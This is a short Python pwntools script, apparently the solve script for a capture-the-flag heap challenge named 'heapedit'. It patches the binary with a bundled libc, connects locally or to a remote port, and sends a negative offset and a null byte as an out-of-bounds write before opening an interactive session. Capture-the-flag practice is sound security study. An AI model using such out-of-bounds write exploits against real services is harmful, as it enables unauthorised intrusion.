#!/bin/python3
from pwn import *
import os
import shutil

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

shutil.copy2("heapedit", "chall-patched")
binary = context.binary = ELF("./chall-patched")
ELF.set_interpreter(binary.path, ld.path)
ELF.patch_custom_libraries(binary.path, libc.path.removesuffix("/libc.so.6"), False)

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

os.remove("chall-patched")

###########
# EXPLOIT #
###########
io.sendline(b"-5144")
io.sendline(b"\x00")
io.interactive()
